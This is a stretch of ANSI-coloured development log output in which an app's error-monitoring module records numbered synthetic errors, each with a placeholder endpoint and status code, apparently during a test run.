WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.748936Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m24[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1178'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_78[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m578[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.748984Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m24[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1179'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_79[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m579[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.749031Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m24[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1180'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_80[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m580[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.749079Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m24[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1181'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_81[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m581[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.749126Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m24[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1182'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_82[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m582[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.749174Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m24[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1183'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_83[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m583[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.749222Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m24[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1184'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_84[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m584[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.749318Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m24[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1185'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_85[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m585[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.749395Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m24[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1186'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_86[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m586[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.749453Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m24[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1187'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_87[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m587[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.749505Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m24[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1188'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_88[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m588[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.749555Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m24[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1189'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_89[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m589[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.749604Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m24[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1190'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_90[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m590[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.749652Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m24[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1191'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_91[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m591[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.749701Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m24[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1192'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_92[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m592[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.749750Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m24[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1193'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_93[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m593[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.749798Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m24[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1194'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_94[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m594[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.749847Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m24[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1195'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_95[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m595[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.749901Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m24[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1196'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_96[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m596[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.749949Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m24[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1197'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_97[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m597[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.750045Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m24[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1198'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_98[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m598[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.750118Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m24[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1199'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_99[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m599[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.750173Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m25[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1200'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_0[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m400[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.750279Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m25[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1201'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_1[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m401[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.750354Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m25[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1202'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_2[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m402[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.750413Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m25[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1203'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_3[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m403[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.750464Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m25[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1204'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_4[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m404[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.750514Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m25[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1205'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_5[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m405[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.750562Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m25[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1206'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_6[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m406[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.750610Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m25[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1207'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_7[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m407[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.750660Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m25[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1208'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_8[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m408[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.750710Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m25[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1209'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_9[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m409[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.750761Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m25[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1210'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_10[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m410[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.750811Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m25[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1211'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_11[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m411[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.750861Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m25[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1212'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_12[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m412[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.750909Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m25[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1213'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_13[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m413[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.750957Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m25[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1214'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_14[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m414[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.751006Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m25[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1215'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_15[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m415[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.751055Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m25[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1216'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_16[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m416[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.751161Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m25[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1217'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_17[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m417[0m
